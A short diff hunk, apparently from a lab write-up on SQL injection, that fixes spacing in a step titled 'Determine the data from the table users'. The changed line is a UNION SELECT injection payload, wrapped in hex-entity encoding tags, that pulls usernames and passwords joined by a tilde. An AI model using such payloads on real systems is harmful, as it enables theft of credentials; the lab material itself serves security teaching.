@@ -17,7 +17,7 @@ The database contains a `users` table, which contains the usernames and password
 2/ Determine the data from the table "users" and the columns "username" and "password"
 
 ```sql
-<@hex_entities>UNION SELECT username || '~'  || password  FROM users</@hex_entities>
+<@hex_entities>UNION SELECT username || '~' || password  FROM users</@hex_entities>
 ```
 
 ```text
